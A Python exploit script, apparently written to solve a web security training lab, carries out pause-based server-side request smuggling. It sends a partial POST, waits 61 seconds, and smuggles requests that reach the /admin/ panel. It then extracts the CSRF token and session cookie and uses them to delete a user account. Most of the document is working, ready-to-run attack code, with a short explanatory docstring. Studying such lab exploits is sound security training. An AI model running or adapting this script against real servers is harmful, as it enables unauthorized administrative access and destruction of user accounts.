import ssl
import socket
import urllib3
import sys
import time
import re
from bs4 import BeautifulSoup
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Server-side pause-based request smuggling

#### **Vulnerability Overview**
"""This lab is vulnerable to **pause-based server-side request smuggling** (CL.0 desync).
- The **front-end server** **streams** incoming requests to the back-end.
- The **back-end server** **fails to close the connection** after a timeout on some endpoints.
- This improper timeout handling allows an attacker to **pause the transmission** of an HTTP request,
  causing the back-end server to misinterpret the next part of the request as a new request.

#### **How the Attack Works**
1. The attacker sends an **incomplete request** with a `Content-Length: 41` header but **delays sending** the body.
2. The back-end **waits indefinitely**, expecting the remaining data.
3. After a pause (e.g., 61 seconds), the attacker sends the **smuggled request**, which gets processed as a separate request.
4. This allows access to restricted areas (e.g., `/admin/`) or manipulation of requests.

#### **Conclusion**
The vulnerability occurs because the **back-end does not enforce a strict timeout** for incomplete requests.
By leveraging this, an attacker can **smuggle arbitrary requests** into the back-end server, 
potentially bypassing security controls, accessing restricted pages, or even performing administrative actions."""

def Extract_Csrf(data):
    """
    Extracts CSRF token and session value from the response data.
    """
    try:
        soup = BeautifulSoup(data, "html.parser")
        CSRF = soup.find("input", {"name": "csrf"})['value']  # Extract CSRF token
        session = str(re.findall(r"session=.+;", data)[0])  # Extract session cookie
        return CSRF, session.split(";")[0]
    except Exception as err:
        print(f'  (-) - Error extracting CSRF token: {err}')


def pause_based(target_host, target_port):
    """
    Performs a pause-based request smuggling attack.
    """
    # First payload: Normal request header to create a delay before sending smuggling payload
    payload_normal_part = (
        "POST /resources HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 41\r\n"
        "\r\n"
    )
    
    # Second payload: Smuggled request to access the admin panel
    payload_smuggling_part = (
        "GET /admin/ HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "\r\n"
    )
    
    try:
        ssl_context = ssl.create_default_context()
        with socket.create_connection((target_host, target_port)) as sock:
            with ssl_context.wrap_socket(sock, server_hostname=target_host) as securesock:
                print('  (+) - Sending first half of payload...')
                securesock.sendall(payload_normal_part.encode())  # Send first part of payload
                print('  (+) - First half sent, waiting for 61 seconds...')
                time.sleep(61)  # Introduce delay to pause the request
                
                print('  (+) - Sending second half of payload...')
                securesock.sendall(payload_smuggling_part.encode())  # Send smuggling part
                print('  (+) - Second half sent.')
                
                # Receive response for the first request
                response_Normal_payload = securesock.recv(4096)
                
                # Send a normal GET request to check if smuggling worked
                GET_Normal_Payload = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
                securesock.sendall(bytes(GET_Normal_Payload.encode()))
                response_ToGet_smugglingResponse = securesock.recv(4096)
                
                # Verify if the smuggled request was processed successfully
                if "HTTP/1.1 302 Found" in response_Normal_payload.decode():
                    if "HTTP/1.1 200 OK" in response_ToGet_smugglingResponse.decode():
                        print('  (+) - Smuggling response received')
                        print('  (+) - Checking for Admin panel...')
                        
                        if "Admin panel" in response_ToGet_smugglingResponse.decode():
                            print('  (+) - Admin panel access confirmed')
                            print('  (+) - Extracting CSRF token...')
                            
                            # Extract CSRF token and session value
                            CSRF, session = Extract_Csrf(response_ToGet_smugglingResponse.decode())
                            print(f"  (+) - CSRF FOUND: {CSRF}")
                            print(f"  (+) - SESSION FOUND: {session.split('=')[1]}")
                            
                            # Second exploitation attempt: Delete user Carlos
                            print('(+) INITIATING SECOND PART OF THE EXPLOIT...')
                            # First payload: Normal request header to create a delay before sending smuggling payload
                            payload2_normal_part = (
                                "POST /resources HTTP/1.1\r\n"
                                f"Host: {target_host}\r\n"
                                f"Cookie: {session}\r\n"
                                "Connection: keep-alive\r\n"
                                "Content-Type: application/x-www-form-urlencoded\r\n"
                                "Content-Length: 159\r\n"
                                "\r\n"
                            )
                             # Second payload: Smuggled request to delete user carlos 
                            payload2_smuggling_part = (
                                "POST /admin/delete/ HTTP/1.1\r\n"
                                "Host: localhost\r\n"
                                "Content-Type: x-www-form-urlencoded\r\n"
                                "Content-Length: 53\r\n"
                                "\r\n"
                                f"csrf={CSRF}&username=carlos"
                            )
                            
                            print('  (+) - Deleting user Carlos...')
                            with socket.create_connection((target_host, target_port)) as sock:
                                with ssl_context.wrap_socket(sock, server_hostname=target_host) as securesock:
                                    print('  (+) - Sending first half of deletion payload...')
                                    securesock.sendall(payload2_normal_part.encode())
                                    print('  (+) - First half sent, waiting for 61 seconds...')
                                    time.sleep(61)
                                    
                                    print('  (+) - Sending second half of deletion payload...')
                                    securesock.sendall(payload2_smuggling_part.encode())
                                    
                                    # Verify response
                                    print('  (+) - Checking response...')
                                    response2_Normal_payload = securesock.recv(4096)
                                    securesock.sendall(bytes(GET_Normal_Payload.encode()))
                                    response2_ToGet_smugglingResponse = securesock.recv(4096)
                                    
                                    if "HTTP/1.1 302 Found" in response2_Normal_payload.decode() and response2_ToGet_smugglingResponse:
                                        print('  (+) - Carlos deleted successfully!')
                                        print('  (+) - Lab solved successfully!')
                                        sys.exit()
                                    else:
                                        print('  (-) - Unexpected error occurred!')
                                        sys.exit()
                        else:
                            print('  (-) - Admin panel not found in smuggling response!')
                            sys.exit()
                elif "504 Gateway Timeout" in response_Normal_payload.decode():
                    print("  (-) - No response received (504 Gateway Timeout).")
                    sys.exit(1)  # Exit if the server times out
                else:
                    print('  (-) - Unknown error!')
                    sys.exit()
    except Exception as err:
        print(f'  (-) - Error: {err}')


def main():
    """
    Main function to execute the exploit.
    """
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = 443
    print('(+) INITIATING FIRST PART OF THE EXPLOIT...')
    print("  (+) - Starting exploit...")
    pause_based(target_host, target_port)


if __name__ == "__main__":
    main()
